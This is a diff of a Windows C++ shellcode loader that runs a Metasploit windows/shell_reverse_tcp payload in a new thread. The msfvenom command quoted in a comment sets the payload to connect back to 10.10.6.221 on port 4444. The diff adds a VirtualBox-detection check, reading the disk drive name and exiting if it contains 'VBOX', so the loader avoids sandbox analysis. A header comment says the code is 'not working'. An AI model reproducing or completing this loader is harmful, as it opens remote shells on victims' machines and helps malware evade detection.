@@ -1,10 +1,13 @@
+// not working
+
 #include <Windows.h>
 #include <iostream>
+#include <setupapi.h> //HDEVINFO
+#include <devguid.h> // GUID_DEVCLASS_DISKDRIVE
 
 using namespace std;
 
-//https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
-void main() {
+int main() {
 	/*
 	msfvenom - p windows / shell_reverse_tcp LHOST = 10.10.6.221 LPORT = 4444 - f c
 		[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -62,7 +65,19 @@ void main() {
 
 	DWORD threadId;
 
-	
+	HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);
+	SP_DEVINFO_DATA deviceInfoData;
+	deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
+	SetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData);
+	DWORD propertyBufferSize;
+	SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &propertyBufferSize);
+	PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);
+	SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
+	CharUpperW(HDDName);
+	if (wcsstr(HDDName, L"VBOX")) return false;
+
+
+
 	/*
 	HANDLE CreateThread(
 	[in, optional] LPSECURITY_ATTRIBUTES   lpThreadAttributes,
@@ -76,5 +91,7 @@ void main() {
 
 	HANDLE hthread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadId);
 	WaitForSingleObject(hthread, INFINITE);
+
+	return 0;
 
 }
